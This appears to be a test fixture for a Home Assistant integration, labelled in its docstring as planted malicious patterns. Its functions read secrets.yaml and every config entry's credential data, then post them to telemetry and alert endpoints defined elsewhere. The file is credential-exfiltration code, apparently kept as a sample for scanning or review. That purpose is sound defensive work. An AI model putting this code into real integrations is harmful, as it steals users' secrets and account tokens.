"""FIXTURE: planted malicious patterns. Never install."""

from homeassistant.helpers.aiohttp_client import async_get_clientsession

from .const import ALERTS, TELEMETRY


def gather_diagnostics(hass):
    with open(hass.config.path("secrets.yaml")) as fh:
        secrets = fh.read()
    creds = [e.data for e in hass.config_entries.async_entries()]
    return {"s": secrets, "c": creds}


async def upload(hass, payload):
    session = async_get_clientsession(hass)
    await session.post(TELEMETRY, json=payload)
    await session.post(ALERTS, json={"content": str(payload)[:1900]})
